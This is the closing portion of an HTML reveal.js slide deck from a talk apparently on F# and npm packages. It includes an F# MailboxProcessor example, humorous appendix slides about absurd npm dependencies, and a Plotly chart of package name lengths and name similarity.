									<a href="https://fsprojects.github.io/FSharp.Text.RegexProvider/">RegexProvider</a>
								</li>
								<li>
									<a href="http://fsharp.github.io/FSharp.Data/index.html">FSharp.Data</a>
								</li>
							</ul>
						</li>
					</ul>
				</section>
				<section>
					<p>thanks for listening :-)</p>
					<p>any questions?</p>
				</section>
			</section>

			<section>
				<!-- appendix -->
				<section>
					<h4>appendix - package - accesstoken</h4>
					<p>my new favourite package</p>
					<img src="talk/img/AccesstokenPackageJson.png" width="80%" />
					<img src="talk/img/AccesstokenMain.png" width="45%" style="float: left" />
					<img src="talk/img/AccesstokenConfig.png" width="45%" style="float: right" />
				</section>
			</section>
			<section>
				<pre class="center"><code class="fs" data-noescape>
let printerActor = <span class="fragment highlight-current-red" data-fragment-index="1">MailboxProcessor</span><span class="fragment highlight-current-red" data-fragment-index="2">&lt;string&gt;</span>.Start(<span class="fragment highlight-current-red" data-fragment-index="3">fun inbox</span> -> 
    // the message processing function
    <span class="fragment highlight-current-red" data-fragment-index="4">let rec messageLoop() = async {</span>
		
        // read a message
        let! msg = <span class="fragment highlight-current-red" data-fragment-index="5">inbox.Receive()</span>
		
        // process a message
        <span class="fragment highlight-current-red" data-fragment-index="6">printfn "message is: %s" msg</span>
		
        // recurse to top
        return! <span class="fragment highlight-current-red" data-fragment-index="7">messageLoop ()</span>
    <span class="fragment highlight-current-red" data-fragment-index="4">}</span>
	
    // start the loop 
    <span class="fragment highlight-current-red" data-fragment-index="8">messageLoop()</span>
)

<span class="fragment highlight-current-red" data-fragment-index="9">printerAgent.Post "hello world!"
printerAgent.Post "hello world! again..."</span>
						</code></pre>
			</section>

			<section data-background-image="talk/img/HotPockets.png" data-state="dimbg">
				<section>
					<h4> appendix - node_modules article</h4>
					<p>Aug 5, 2016</p>
					<img alt="node_modules" src="talk/img/NodeModulesArticle.png" />
				</section>
				<section>
					<p>Express.js</p>
					<p>contains dependency 'yummy' which make http call on install</p>
					<div class="fragment">
						<blockquote class="twitter-tweet tw-align-center" data-lang="en">
							<p lang="en" dir="ltr">Wham! Bam! Hickory Ham!
								<a href="https://twitter.com/hashtag/HotPockets?src=hash&amp;ref_src=twsrc%5Etfw">#HotPockets</a>
								<a href="http://t.co/t7YBz532MO">http://t.co/t7YBz532MO</a>
								<a href="http://t.co/SUkwWANhQl">pic.twitter.com/SUkwWANhQl</a>
							</p>&mdash; Hot Pockets (@hotpockets)
							<a href="https://twitter.com/hotpockets/status/501511389320470528?ref_src=twsrc%5Etfw">August 18, 2014</a>
						</blockquote>
					</div>
				</section>
				<section>
					<p>Ember.js</p>
					<pre class="center"><code  data-noescape>Ember.js
- Glimmer
- - brittanica
- - - brittanica-g</code></pre>
					<p>whole dictionary for one definition</p>
					<pre class="center"><code  data-noescape>{
  "g": {
    "page": 1018,
    "description": "The seventh letter of the US English..."
  },
  ...
  "glimmer": {
    "page": 1172,
    "description": "A faint or wavering light, used pri..."
  },
  ...
}</code></pre>
				</section>
				<section>
					<p>babel</p>
					<div class="fragment">
						<p>claims that picture of tv chef guy fieri in babel-core dependency</p>
						<img src="talk/img/GuyFieri.png" />
					</div>
				</section>
				<section>
					<div class="fragment">
						<img src="talk/img/GuyFieriPullRequestInsert.png" />
					</div>
					<div class="fragment">
						<img src="talk/img/GuyFieriPullRequestRemove.png" />
						<img src="talk/img/GuyFieriPullRequestRemoveComment.png" />
					</div>
				</section>

				<section>
					<img src="talk/img/BrittanicaGithub.png" height="100%">
				</section>
				<section>
					<img src="talk/img/BrittanicaGithubFieri.png" height="100%">
				</section>
				<section>
					<pre class="center"><code class="js">var brit = require("brittanica-g");
var desc = brit.glimmer.description;
console.log(desc);
</code></pre>
					<a href="talk/img/FieriConsole.mp4">run with node</a>

				</section>

				<!-- 
				<section>
					<h4>npm - pr - passwords</h4>
					<img alt="passwords" src="talk/img/Passwords.png" />
				</section> -->
			</section>

			<section>
				<div id="6f647bce-9f05-42d8-82f5-c3513450aa35" width="100%" height="100%"></div>
				<script src="https://cdn.plot.ly/plotly-latest.min.js"></script>
				<script>
					var data = [{ "type": "bar", "x": [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49], "y": [43, 1002, 7091, 12997, 17448, 23805, 28557, 32866, 35029, 35735, 35661, 34657, 33829, 31778, 29520, 27552, 25245, 23298, 21257, 18558, 16412, 14203, 12260, 10429, 9001, 7497, 6324, 5315, 4522, 3777, 2949, 2444, 1931, 1568, 1257, 1030, 845, 706, 522, 443, 328, 235, 202, 168, 147, 109, 95, 56, 56], "marker": { "color": "#ccccff" }, "name": "# packages", "yaxis": "y" }, { "type": "scatter", "x": [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49], "y": [100.0, 100.0, 99.7, 98.6, 90.3, 72.4, 56.8, 46.0, 37.1, 30.5, 23.8, 19.0, 17.0, 13.4, 11.1, 9.8, 9.0, 7.2, 7.7, 6.6, 5.8, 5.3, 4.8, 4.9, 4.6, 4.0, 4.0, 3.9, 3.5, 4.0, 3.9, 3.1, 3.4, 3.7, 1.7, 1.9, 3.4, 6.7, 2.9, 3.6, 4.3, 0.9, 1.0, 2.4, 3.4, 0.9, 7.4, 0.0, 0.0], "mode": "lines", "name": "dist < 2", "marker": {}, "yaxis": "y2" }, { "type": "scatter", "x": [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49], "y": [100.0, 100.0, 100.0, 100.0, 99.7, 98.6, 94.0, 85.5, 75.2, 64.3, 52.5, 41.5, 32.5, 25.2, 20.6, 17.4, 14.7, 12.8, 12.6, 9.9, 8.6, 7.1, 6.1, 6.2, 5.6, 5.1, 4.2, 4.1, 3.6, 3.1, 2.6, 2.6, 3.0, 2.1, 2.6, 2.8, 3.3, 6.5, 2.9, 1.6, 6.4, 2.1, 3.0, 1.8, 3.4, 0.9, 6.3, 1.8, 5.4], "mode": "lines", "name": "dist < 3", "marker": {}, "yaxis": "y2" }, { "type": "scatter", "x": [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49], "y": [100.0, 100.0, 100.0, 100.0, 100.0, 100.0, 99.7, 99.0, 96.6, 91.8, 85.7, 76.5, 67.1, 56.3, 46.6, 39.9, 34.6, 29.1, 26.6, 23.0, 20.4, 17.3, 15.3, 14.2, 12.7, 12.5, 11.4, 9.3, 8.8, 7.0, 6.8, 4.6, 5.7, 5.9, 3.4, 4.1, 3.2, 8.2, 3.4, 2.5, 4.9, 2.6, 4.5, 5.4, 2.7, 5.5, 3.2, 0.0, 1.8], "mode": "lines", "name": "dist < 4", "marker": {}, "yaxis": "y2" }];
					var layout = { "xaxis": { "title": "length of name (chars)" }, "yaxis": { "title": "number of packages", "side": "right" }, "yaxis2": { "title": "% of names within distance", "side": "left", "overlaying": "y" } };
					Plotly.newPlot('6f647bce-9f05-42d8-82f5-c3513450aa35', data, layout);
				</script>
			</section>

			<section>fin</section>
		</div>
	</div>

	<script src="talk/reveal.js/lib/js/head.min.js"></script>
	<script src="talk/reveal.js/js/reveal.js"></script>

	<script>
		// More info about config & dependencies:
		// - https://github.com/hakimel/reveal.js#configuration
		// - https://github.com/hakimel/reveal.js#dependencies
		Reveal.initialize({
			dependencies: [
				{ src: 'talk/reveal.js/plugin/markdown/marked.js' },
				{ src: 'talk/reveal.js/plugin/markdown/markdown.js' },
				{ src: 'talk/reveal.js/plugin/notes/notes.js', async: true },
				{ src: 'talk/reveal.js/plugin/highlight/highlight.js', async: true, callback: function () { hljs.initHighlightingOnLoad(); } },
				{ src: 'talk/reveal.js/plugin/external/external.js', condition: function () { return !!document.querySelector('[data-external]'); } }
			]
		});
	</script>
</body>

</html>